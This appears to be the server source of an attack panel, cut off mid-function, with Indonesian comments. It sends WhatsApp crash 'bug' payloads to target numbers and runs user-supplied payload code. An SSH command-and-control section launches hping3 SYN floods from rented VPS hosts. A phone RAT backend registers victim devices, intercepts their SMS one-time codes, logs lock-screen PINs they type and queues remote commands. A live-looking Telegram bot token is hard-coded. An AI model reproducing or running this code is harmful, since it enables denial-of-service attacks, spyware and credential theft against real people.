const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@bellachu/baileys");
const express = require("express");
const multer = require("multer");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
const chatroomUpload = multer({ dest: uploadDir });
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
// Satu HTTP server untuk Express API, static files, dan WebSocket.
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  //{ bug_id: "crash_spam", bug_name: "Spam Crash" },
  { bug_id: "click", bug_name: "DELAY HARD" },
  { bug_id: "android", bug_name: "BLANK INVIS" },
  { bug_id: "invisible", bug_name: "COMBO HARD" },
  { bug_id: "ios_invis", bug_name: "ANDRO DELAY" },
  { bug_id: "ios_noinvis", bug_name: "FORCLOSE CLICK" },
  //{ bug_id: "ui_kill", bug_name: "Android UI Killer" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
const KEY_LIST_PATH = path.join(__dirname, "keyList.json");
if (!fs.existsSync(KEY_LIST_PATH)) fs.writeFileSync(KEY_LIST_PATH, "[]");
let sikmanuk = (() => {
  try { return JSON.parse(fs.readFileSync(KEY_LIST_PATH, "utf8") || "[]"); }
  catch { return []; }
})();
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  try { sikmanuk = JSON.parse(fs.readFileSync(KEY_LIST_PATH, "utf8") || "[]"); }
  catch { sikmanuk = []; }
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8948029934:AAGxoEJ6AJbAHL4-madtyQQXFmI0jyCqGRw"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

// Dekorasi visual global untuk pesan dan tombol Telegram.
const visualMarkPattern = /[✓✘⚝➤♲✅❌⚠️⏳📋🗑️🔐🔒📄👤🔑🎯]/u;
function decorateTelegramText(text) {
  const value = String(text ?? "");
  if (!value.trim() || visualMarkPattern.test(value)) return value;
  return value.trimStart().startsWith("<") ? `<b>➤</b> ${value}` : `➤ ${value}`;
}
function decorateTelegramOptions(options = {}) {
  const next = { ...options };
  const keyboard = next.reply_markup?.inline_keyboard;
  if (Array.isArray(keyboard)) {
    next.reply_markup = {
      ...next.reply_markup,
      inline_keyboard: keyboard.map(row => row.map(button => {
        if (!button || typeof button !== "object" || !button.text || visualMarkPattern.test(button.text)) return button;
        return { ...button, text: `➤ ${button.text}` };
      }))
    };
  }
  return next;
}

// Semua pesan teks Telegram memakai rich message HTML secara default.
// Jika pesan sudah menentukan parse_mode Markdown/HTML, nilainya tetap dipakai.
const originalSendMessage = bot.sendMessage.bind(bot);
bot.sendMessage = (chatId, text, options = {}) => originalSendMessage(chatId, decorateTelegramText(text), decorateTelegramOptions({
  parse_mode: "HTML",
  ...options
}));

// RichMessage custom: dipakai jika gateway Telegram mendukung sendRichMessage.
// Pada Bot API standar, otomatis fallback ke sendMessage agar tombol tetap berfungsi.
async function sendStyledRichMessage(chatId, html, inlineKeyboard = [], fallbackOptions = {}) {
  const standardKeyboard = inlineKeyboard.map(row => row.map(button => {
    if (!button || typeof button !== "object") return button;
    const { style, ...telegramButton } = button;
    return telegramButton;
  }));
  const richPayload = {
    chat_id: chatId,
    rich_message: { html: String(html) },
    reply_markup: { inline_keyboard: inlineKeyboard }
  };
  try {
    if (typeof bot._request !== "function") throw new Error("custom rich API unavailable");
    return await bot._request("sendRichMessage", {
      form: {
        chat_id: chatId,
        rich_message: JSON.stringify(richPayload.rich_message),
        reply_markup: JSON.stringify(richPayload.reply_markup)
      }
    });
  } catch (error) {
    console.warn("[RichMessage fallback]", error.message || error);
    return originalSendMessage(chatId, decorateTelegramText(html), decorateTelegramOptions({
      parse_mode: "HTML",
      ...fallbackOptions,
      reply_markup: { inline_keyboard: standardKeyboard }
    }));
}
}

const ID_GROUP = [
    +-1003775321153,
];

const ID_GROUP_UTAMA = [
    -1003775321153,
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 5512285512;
const BOT_STARTED_AT = Date.now();
const BOT_TIMERS = new Map();
const APP_UPDATE_FILE = path.join(__dirname, "app-update.json");

function loadAppUpdate() {
  const fallback = { versionCode: 1, versionName: "1.0.0", apkUrl: "", releaseNotes: "", updatedAt: null };
  if (!fs.existsSync(APP_UPDATE_FILE)) {
    fs.writeFileSync(APP_UPDATE_FILE, JSON.stringify(fallback, null, 2));
    return fallback;
  }
  try { return { ...fallback, ...JSON.parse(fs.readFileSync(APP_UPDATE_FILE, "utf8")) }; }
  catch { return fallback; }
}
function saveAppUpdate(data) { fs.writeFileSync(APP_UPDATE_FILE, JSON.stringify(data, null, 2)); }
function normalizeGithubApkUrl(value) {
  let parsed;
  try { parsed = new URL(String(value || "").trim()); } catch { return null; }
  if (parsed.protocol !== "https:") return null;
  const host = parsed.hostname.toLowerCase();
  if (!["github.com", "raw.githubusercontent.com", "objects.githubusercontent.com"].includes(host)) return null;
  if (host === "github.com" && parsed.pathname.includes("/blob/")) {
    parsed.hostname = "raw.githubusercontent.com";
    parsed.pathname = parsed.pathname.replace("/blob/", "/");
  }
  return parsed.toString();
}

// Endpoint update untuk UI aplikasi: /request?version=1.0.0 atau /request?versionCode=1
app.get("/request", (req, res) => {
  const update = loadAppUpdate();
  const currentVersion = String(req.query.version || req.query.currentVersion || "0.0.0");
  const currentCode = Number(req.query.versionCode || 0);
  const updateAvailable = Boolean(update.apkUrl) && (Number(update.versionCode) > currentCode || (Number(update.versionCode) === currentCode && update.versionName !== currentVersion));
  return res.json({ success: true, updateAvailable, latestVersion: update.versionName, versionName: update.versionName, versionCode: Number(update.versionCode), downloadUrl: updateAvailable ? update.apkUrl : "", apkUrl: updateAvailable ? update.apkUrl : "", releaseNotes: update.releaseNotes || "", updatedAt: update.updatedAt });
});

// Alias yang lebih deskriptif untuk UI baru.
app.get("/api/app-update", (req, res) => {
  req.url = `/request?${new URLSearchParams(req.query).toString()}`;
  return res.redirect(307, req.url);
});
  
wss.on('connection', function (ws, req) {
  let username = null;
  let keepAliveInterval = null;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validKey.username,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));

        // Keep alive interval
        keepAliveInterval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          
          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!data.androidId || validKey.androidId !== data.androidId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }
        }, 10000);
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
      
      // ========== HANDLE STATS ==========
      if (data.type === 'stats') {
        // Hitung online users dari activeKeys yang masih valid
        const now = Date.now();
        const onlineUserNames = [];
        
        for (const key in activeKeys) {
          const keyInfo = activeKeys[key];
          if (keyInfo && keyInfo.expires > now) {
            onlineUserNames.push(keyInfo.username);
          }
        }
        
        // Unique users
        const uniqueOnlineUsers = [...new Set(onlineUserNames)];
        
        // Hitung active connections (jumlah WebSocket yang connect)
        let activeConnectionsCount = 0;
        for (const clientId in wsClients) {
          if (wsClients[clientId] && wsClients[clientId].readyState === WebSocket.OPEN) {
            activeConnectionsCount++;
          }
        }
        
        // Kirim balik ke client
        ws.send(JSON.stringify({
          type: 'stats',
          onlineUsers: uniqueOnlineUsers.length,
          activeConnections: activeConnectionsCount
        }));
        return;
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    // Bersihkan interval
    if (keepAliveInterval) {
      clearInterval(keepAliveInterval);
      keepAliveInterval = null;
    }
    
    // Hapus dari wsClients
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const TARGETS_FILE = './targets.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const readData = (file) => {
    if (!fs.existsSync(file)) return [];
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || '[]');
    } catch (e) { return []; }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// Port HTTP/Express/WebSocket panel.
// Pterodactyl dapat mengganti nilainya melalui environment PORT.
const PORT = Number(process.env.PORT || 7144);




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

// --- MODIFIKASI: ENDPOINT HEARTBEAT 2 DETIK ---
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);

    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    }
    
    res.status(200).send('1'); 
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);

    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveData(TARGETS_FILE, targets);
    res.json({ status: 'ok' });
});

app.get('/api/list-targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    
    // Log khusus jika data berasal dari SMS Receiver
    if(req.body.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
    }

    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    
    saveData(COMMANDS_FILE, commands);
    console.log(`[CMD] Operator -> ${id}: ${command}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);

    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1); 
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);

    // SUNTIKAN: Log Khusus untuk mencuri input Password/PIN dari Hard-Lock
    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
    }

    const index = responses.findIndex(r => r.targetId === targetId);
    const newRes = { targetId, cmd, data, timestamp: new Date() };

    if (index !== -1) responses[index] = newRes;
    else responses.push(newRes);
    
    saveData(RESPONSES_FILE, responses);
    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
    res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.find(r => r.targetId === req.params.id);
    res.json(resData || {});
});

app.post('/api/login', (req, res) => {
    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
});

app.post("/test-function", async (req, res) => {
    const { key, target, function: func, delay = 220, loops = 1 } = req.body;

    const rawTargets = parseTargets(target);
    if (!key || !func || !rawTargets.length) {
        return res.json({ success: false, message: "Data tidak lengkap" });
    }

    const targets = rawTargets
        .map(toJid)
        .filter(jid => typeof jid === "string" && jid.endsWith("@s.whatsapp.net"));

    if (!targets.length) {
        return res.json({ success: false, message: "Target tidak valid" });
    }

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ success: false, message: "Key tidak valid" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
        return res.json({ success: false, message: "User tidak ditemukan" });
    }

    const routeMismatch = getRouteMismatchPayload(user, req);
    if (routeMismatch) {
        return res.json({ success: false, cooldown: false, ...routeMismatch });
    }

    user.role ??= "member";
    const role = normalizeRoleKey(user.role);

    const roleCooldowns = {
        member: 200,
        vip: 200,
        reseller: 160,
        moderator: 100,
        pt: 60,
        tk: 0,
        all_access: 0,
        developer: 0,
        owner: 0,
    };

    const cooldown = roleCooldowns[role] ?? 60;
    const now = Date.now();
    user.lastSend ??= 0;
    const diff = Math.floor((now - user.lastSend) / 1000);
    if (diff < cooldown) {
        return res.json({
            success: false,
            cooldown: true,
            wait: cooldown - diff,
            role,
            message: "Masih cooldown"
        });
    }

    user.lastSend = now;
    saveDatabase(db);

    let execFn;
    try {
        execFn = toFunction(func);
        if (!execFn) throw new Error("Source is not a function / syntax error");
    } catch (err) {
        return res.json({ success: false, message: "Syntax error: " + err.message });
    }

    const logEntry = {
        id: now,
        username: user.username,
        role,
        targets,
        delay,
        loops,
        status: "pending",
        time: now
    };

    tempFuncLog.push(logEntry);

    res.json({
        success: true,
        message: "Function diterima & diproses",
        role,
        targets,
        logId: now
    });


    testFunctionQueue.enqueue(() => processTestFunctionJob({
        username: user.username,
        targets,
        func, // Pass the string!
        delay,
        loops,
        logId: now
    }));
});

const toFunction = src => {
    try {
        const safeSrc = normalizeUserFunction(src);

        return new Function(
            "otax",
            "target",
            "ctx",
            `"use strict";
       const {
         generateWAMessageFromContent,
         generateWAMessage,
         prepareWAMessageMedia,
         relayWAMessage,
         proto,
         sleep,
         crypto
       } = ctx;
       const { randomBytes } = crypto;

       const fn = (${safeSrc});
       if (typeof fn !== "function")
         throw new Error("Source is not a function");

       return fn(otax, target, ctx);
      `
        );
    } catch (e) {
        console.error('[CUSTOM PAYLOAD EXEC]', e.message);
        return null;
    }
};

const CHATROOM_FILE = path.join(__dirname, "chatroom.json");
const CHATROOM_UPLOAD_DIR = path.join(__dirname, "uploads");

let lastChatroomCleanupDate = new Date().toDateString();
setInterval(() => {
    try {
        const currentDate = new Date().toDateString();
        if (currentDate !== lastChatroomCleanupDate) {
            if (fs.existsSync(CHATROOM_FILE)) {
                fs.unlinkSync(CHATROOM_FILE);
                console.log(`[CLEANUP] ${new Date().toISOString()} - Chatroom.json dihapus (Pembersihan harian)`);
            }
            lastChatroomCleanupDate = currentDate;
        }
    } catch (err) {
        console.error('[CLEANUP] Error harian chatroom:', err);
    }
}, 10 * 60 * 1000); // Cek tiap 10 menit

if (!fs.existsSync(CHATROOM_UPLOAD_DIR)) fs.mkdirSync(CHATROOM_UPLOAD_DIR, { recursive: true });

function loadChatroom() {
    try {
        const file = fs.readFileSync(CHATROOM_FILE, "utf8");
        const parsed = JSON.parse(file);
        return Array.isArray(parsed) ? parsed : [];
    } catch {
        return [];
    }
}

function saveChatroom(data) {
    fs.writeFileSync(CHATROOM_FILE, JSON.stringify(data, null, 2));
}

function normalizeChatMessage(item) {
    if (!item || typeof item !== "object") return null;

    const type = ["text", "image", "audio"].includes(item.type) ? item.type : "text";
    const time = Number(item.time) || Date.now();
    const from = sanitize(item.from || "Unknown");
    const message = typeof item.message === "string" ? item.message.slice(0, 2000) : "";
    const mediaUrl = typeof item.mediaUrl === "string" ? item.mediaUrl : "";
    const mimeType = typeof item.mimeType === "string" ? item.mimeType : "";
    const fileName = typeof item.fileName === "string" ? item.fileName : "";
    const duration = Number(item.duration) || 0;
    const size = Number(item.size) || 0;
    let replyTo = null;

    if (item.replyTo && typeof item.replyTo === "object") {
        replyTo = {
            id: typeof item.replyTo.id === "string" ? item.replyTo.id : "",
            from: sanitize(item.replyTo.from || "Unknown"),
            type: ["text", "image", "audio"].includes(item.replyTo.type) ? item.replyTo.type : "text",
            message: typeof item.replyTo.message === "string" ? item.replyTo.message.slice(0, 240) : "",
            mediaUrl: typeof item.replyTo.mediaUrl === "string" ? item.replyTo.mediaUrl : "",
            fileName: typeof item.replyTo.fileName === "string" ? item.replyTo.fileName : ""
        };
    }

    return {
        id: item.id || `${time}_${Math.random().toString(36).slice(2, 10)}`,
        from,
        type,
        message,
        mediaUrl,
        mimeType,
        fileName,
        duration,
        size,
        replyTo,
        status: typeof item.status === "string" ? item.status : "terkirim",
        time
    };
}

function appendChatroomMessage(payload) {
    const chats = loadChatroom().map(normalizeChatMessage).filter(Boolean);
    const message = normalizeChatMessage(payload);
    chats.push(message);
    const trimmed = chats.slice(-1000);
    saveChatroom(trimmed);
    return message;
}

function buildAbsoluteUploadUrl(req, relativePath) {
    const host = req.get("host");
    const proto = req.headers["x-forwarded-proto"] || req.protocol || "http";
    return `${proto}://${host}${relativePath}`;
}

function parseReplyPayload(rawReply) {
    if (!rawReply) return null;
    if (typeof rawReply === "string") {
        try {
            return JSON.parse(rawReply);
        } catch {
            return null;
        }
    }
    if (typeof rawReply === "object") {
        return rawReply;
    }
    return null;
}

app.get("/chatroom", (req, res) => {
    const since = Number(req.query.since) || 0;
    const chats = loadChatroom()
        .map(normalizeChatMessage)
        .filter(Boolean)
        .filter(item => item.time > since);
    res.json(chats);
});

app.post("/chatroom", (req, res) => {
    const from = sanitize(req.body.from || "");
    const message = typeof req.body.message === "string" ? req.body.message.trim() : "";

    if (!from || !message) {
        return res.status(400).json({ success: false, message: "from and message are required" });
    }

    const newData = appendChatroomMessage({
        from,
        type: "text",
        message,
        replyTo: parseReplyPayload(req.body.replyTo)
    });

    res.json({ success: true, data: newData });
});

app.post("/chatroom/media", chatroomUpload.single("file"), (req, res) => {
    const from = sanitize(req.body.from || "");
    const message = typeof req.body.message === "string" ? req.body.message.trim().slice(0, 500) : "";

    if (!from) {
        return res.status(400).json({ success: false, message: "from is required" });
    }

    if (!req.file) {
        return res.status(400).json({ success: false, message: "file is required" });
    }

    const mimeType = req.file.mimetype || "";
    const originalName = (req.file.originalname || "").toLowerCase();
    const ext = path.extname(originalName);
    const imageExts = new Set([".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp"]);
    const audioExts = new Set([".m4a", ".aac", ".mp3", ".wav", ".ogg", ".opus", ".3gp"]);
    const isImage = mimeType.startsWith("image/") || imageExts.has(ext);
    const isAudio = mimeType.startsWith("audio/") || audioExts.has(ext);

    if (!isImage && !isAudio) {
        try { fs.unlinkSync(req.file.path); } catch { }
